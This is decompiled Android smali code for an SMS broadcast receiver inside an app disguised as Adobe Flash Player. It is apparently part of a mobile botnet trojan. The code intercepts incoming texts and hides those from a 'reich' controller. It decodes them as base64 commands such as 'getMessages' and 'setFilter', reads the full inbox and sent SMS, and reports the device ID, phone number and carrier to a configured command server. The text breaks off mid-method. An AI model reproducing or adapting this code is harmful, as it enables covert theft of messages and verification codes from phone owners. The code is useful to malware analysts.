.class public Lcom/adobe/flashplayer_/CCC;
.super Landroid/content/BroadcastReceiver;
.source "CCC.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 43
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static millisToDate(J)Ljava/lang/String;
    .locals 3
    .param p0, "currentTime"    # J

    .prologue
    .line 665
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 666
    .local v0, "calendar":Ljava/util/Calendar;
    invoke-virtual {v0, p0, p1}, Ljava/util/Calendar;->setTimeInMillis(J)V

    .line 667
    invoke-virtual {v0}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    .line 668
    .local v1, "date":Ljava/util/Date;
    invoke-virtual {v1}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v2

    .line 669
    .local v2, "finalDate":Ljava/lang/String;
    return-object v2
.end method

.method private readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 599
    const-string v4, ""

    .line 602
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p2, p1}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 604
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 605
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 606
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 607
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 608
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 610
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 614
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 615
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 622
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 611
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 618
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 619
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 15
    .param p1, "Reich_ServerGate"    # Ljava/lang/String;
    .param p2, "i"    # Ljava/lang/String;
    .param p3, "rep"    # Ljava/lang/String;
    .param p4, "c"    # Landroid/content/Context;

    .prologue
    .line 629
    const-string v10, "BotID"

    move-object/from16 v0, p4

    invoke-direct {p0, v10, v0}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 630
    .local v1, "BotID":Ljava/lang/String;
    const-string v10, "BotNetwork"

    move-object/from16 v0, p4

    invoke-direct {p0, v10, v0}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    .line 631
    .local v3, "BotNetwork":Ljava/lang/String;
    const-string v10, "BotLocation"

    move-object/from16 v0, p4

    invoke-direct {p0, v10, v0}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    .line 632
    .local v2, "BotLocation":Ljava/lang/String;
    sget-object v6, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 633
    .local v6, "SDK":Ljava/lang/String;
    const-string v10, "BotVer"

    move-object/from16 v0, p4

    invoke-direct {p0, v10, v0}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    .line 634
    .local v5, "BotVer":Ljava/lang/String;
    const-string v10, "BotPrefix"

    move-object/from16 v0, p4

    invoke-direct {p0, v10, v0}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 635
    .local v4, "BotPrefix":Ljava/lang/String;
    const-string v10, "phone"

    move-object/from16 v0, p4

    invoke-virtual {v0, v10}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 636
    .local v9, "tMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v7

    .line 638
    .local v7, "pn":Ljava/lang/String;
    if-nez v7, :cond_1

    const-string v7, ""

    .line 641
    :goto_0
    if-nez v1, :cond_0

    invoke-virtual/range {p4 .. p4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    const-string v11, "android_id"

    invoke-static {v10, v11}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 644
    :cond_0
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "a=2&b="

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&c="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ":"

    const-string v12, ""

    invoke-virtual {v3, v11, v12}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&d="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&e="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&f="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&g="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&h="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    move-object/from16 v0, p3

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&prefix="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 646
    .local v8, "request":Ljava/lang/String;
    new-instance v10, Lcom/adobe/flashplayer_/BBB000;

    invoke-direct {v10}, Lcom/adobe/flashplayer_/BBB000;-><init>()V

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/String;

    const/4 v12, 0x0

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-static/range {p1 .. p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v14, "?"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    aput-object v13, v11, v12

    invoke-virtual {v10, v11}, Lcom/adobe/flashplayer_/BBB000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 647
    return-void

    .line 638
    .end local v8    # "request":Ljava/lang/String;
    :cond_1
    const-string v10, "+"

    const-string v11, ""

    invoke-virtual {v7, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    goto/16 :goto_0
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "c"    # Landroid/content/Context;

    .prologue
    .line 588
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 589
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 590
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 594
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 592
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 65
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 46
    const-string v39, "reich"

    .line 47
    .local v39, "master":Ljava/lang/String;
    const/16 v35, 0x0

    .line 49
    .local v35, "h":Z
    const-string v4, "Reich_ServerGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v22

    .line 51
    .local v22, "URL":Ljava/lang/String;
    const-string v4, "connectivity"

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Landroid/net/ConnectivityManager;

    .line 52
    .local v27, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual/range {v27 .. v27}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v43

    .line 55
    .local v43, "netInfo":Landroid/net/NetworkInfo;
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v51

    .line 56
    .local v51, "pudsBundle":Landroid/os/Bundle;
    const-string v4, "pdus"

    move-object/from16 v0, v51

    invoke-virtual {v0, v4}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v50

    check-cast v50, [Ljava/lang/Object;

    .line 57
    .local v50, "pdus":[Ljava/lang/Object;
    const/4 v4, 0x0

    aget-object v4, v50, v4

    check-cast v4, [B

    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v40

    .line 59
    .local v40, "message":Landroid/telephony/SmsMessage;
    move-object/from16 v0, v50

    array-length v4, v0

    new-array v0, v4, [Landroid/telephony/SmsMessage;

    move-object/from16 v41, v0

    .line 60
    .local v41, "messages":[Landroid/telephony/SmsMessage;
    const/16 v36, 0x0

    .local v36, "i":I
    :goto_0
    move-object/from16 v0, v50

    array-length v4, v0

    move/from16 v0, v36

    if-lt v0, v4, :cond_12

    .line 66
    const/4 v4, 0x0

    aget-object v56, v41, v4

    .line 67
    .local v56, "smsZ":Landroid/telephony/SmsMessage;
    const-string v24, ""

    .line 69
    .local v24, "body":Ljava/lang/String;
    const-string v4, "BotID"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v13

    .line 70
    .local v13, "BotID":Ljava/lang/String;
    const-string v4, "BotNetwork"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v15

    .line 71
    .local v15, "BotNetwork":Ljava/lang/String;
    const-string v4, "BotLocation"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    .line 73
    .local v14, "BotLocation":Ljava/lang/String;
    const-string v4, "Reich_ServerGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v18

    .line 74
    .local v18, "Reich_ServerGate":Ljava/lang/String;
    const-string v4, "BotVer"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v17

    .line 75
    .local v17, "BotVer":Ljava/lang/String;
    sget-object v19, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 76
    .local v19, "SDK":Ljava/lang/String;
    const-string v4, "BotPrefix"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v16

    .line 77
    .local v16, "BotPrefix":Ljava/lang/String;
    const-string v4, "keyCode"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v38

    .line 81
    .local v38, "keyCode":Ljava/lang/String;
    :try_start_0
    move-object/from16 v0, v41

    array-length v4, v0

    const/4 v6, 0x1

    if-eq v4, v6, :cond_0

    invoke-virtual/range {v56 .. v56}, Landroid/telephony/SmsMessage;->isReplace()Z

    move-result v4

    if-eqz v4, :cond_13

    .line 82
    :cond_0
    invoke-virtual/range {v56 .. v56}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v24

    .line 95
    :goto_1
    invoke-virtual/range {v40 .. v40}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v52

    .line 96
    .local v52, "sender":Ljava/lang/String;
    move-object/from16 v54, v24

    .line 98
    .local v54, "sms":Ljava/lang/String;
    const-string v4, "server"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v58

    .line 100
    .local v58, "svcs":Ljava/lang/String;
    move-object/from16 v0, v52

    move-object/from16 v1, v39

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_c

    .line 103
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/CCC;->abortBroadcast()V

    .line 108
    const/4 v4, 0x0

    :try_start_1
    move-object/from16 v0, v54

    invoke-static {v0, v4}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v59

    .line 109
    .local v59, "temp":[B
    new-instance v60, Ljava/lang/String;

    const-string v4, "UTF-8"

    move-object/from16 v0, v60

    move-object/from16 v1, v59

    invoke-direct {v0, v1, v4}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 114
    .local v60, "tmp":Ljava/lang/String;
    const-string v4, "wifiOn"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_1

    .line 115
    new-instance v4, Lcom/adobe/flashplayer_/WF;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/WF;-><init>()V

    move-object/from16 v0, p1

    invoke-virtual {v4, v0}, Lcom/adobe/flashplayer_/WF;->wifi(Landroid/content/Context;)V

    .line 121
    :cond_1
    const-string v4, "server"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 123
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v26

    .line 125
    .local v26, "buff":[Ljava/lang/String;
    const/4 v4, 0x1

    aget-object v4, v26, v4

    const-string v6, "start"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_15

    .line 127
    const-string v4, "w"

    const-string v6, "NOFILTER"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 128
    const-string v4, "server"

    const-string v6, "start"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 129
    const-string v4, "ReichServer!start:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, p1

    invoke-direct {v0, v1, v13, v4, v2}, Lcom/adobe/flashplayer_/CCC;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 143
    .end local v26    # "buff":[Ljava/lang/String;
    :cond_2
    :goto_2
    const-string v4, "setFilter"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_5

    .line 144
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 145
    .local v28, "cmd_data":[Ljava/lang/String;
    const/4 v4, 0x1

    aget-object v29, v28, v4

    .line 146
    .local v29, "data":Ljava/lang/String;
    const/4 v4, 0x2

    aget-object v23, v28, v4

    .line 148
    .local v23, "action":Ljava/lang/String;
    const-string v4, "start"

    move-object/from16 v0, v23

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_3

    .line 149
    const-string v4, "w"

    move-object/from16 v0, p0

    move-object/from16 v1, v29

    move-object/from16 v2, p1

    invoke-direct {v0, v4, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 153
    :cond_3
    const-string v4, "stop"

    move-object/from16 v0, v23

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_4

    .line 154
    const-string v4, "w"

    const-string v6, "NOFILTER"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 157
    :cond_4
    if-eqz v43, :cond_5

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-eqz v4, :cond_5

    .line 159
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "setFilter["

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v29

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "]"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, v23

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, ":SMSGATE"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p0

    move-object/from16 v1, v22

    move-object/from16 v2, p1

    invoke-direct {v0, v1, v13, v4, v2}, Lcom/adobe/flashplayer_/CCC;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 228
    .end local v23    # "action":Ljava/lang/String;
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v29    # "data":Ljava/lang/String;
    :cond_5
    const-string v4, "getMessages"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_6

    .line 230
    const-string v46, ""

    .line 231
    .local v46, "pack_inbox":Ljava/lang/String;
    const-string v47, ""

    .line 232
    .local v47, "pack_inbox_pack":Ljava/lang/String;
    const-string v48, ""

    .line 233
    .local v48, "pack_outbox":Ljava/lang/String;
    const-string v49, ""

    .line 235
    .local v49, "pack_outbox_pack":Ljava/lang/String;
    const-string v4, "content://sms/inbox"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    .line 236
    .local v5, "inBox":Landroid/net/Uri;
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v37

    .line 237
    .local v37, "inc":Landroid/database/Cursor;
    :goto_3
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_16

    .line 249
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->close()V

    .line 255
    const-string v4, "content://sms/sent"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    .line 256
    .local v7, "outBox":Landroid/net/Uri;
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v45

    .line 257
    .local v45, "ouc":Landroid/database/Cursor;
    :goto_4
    invoke-interface/range {v45 .. v45}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_17

    .line 267
    invoke-interface/range {v45 .. v45}, Landroid/database/Cursor;->close()V

    .line 271
    if-eqz v43, :cond_6

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-eqz v4, :cond_6

    .line 272
    const-string v4, "in.z"

    move-object/from16 v0, p0

    move-object/from16 v1, v46

    move-object/from16 v2, p1

    invoke-direct {v0, v4, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 274
    const-string v4, "out.z"

    move-object/from16 v0, p0

    move-object/from16 v1, v48

    move-object/from16 v2, p1

    invoke-direct {v0, v4, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 276
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

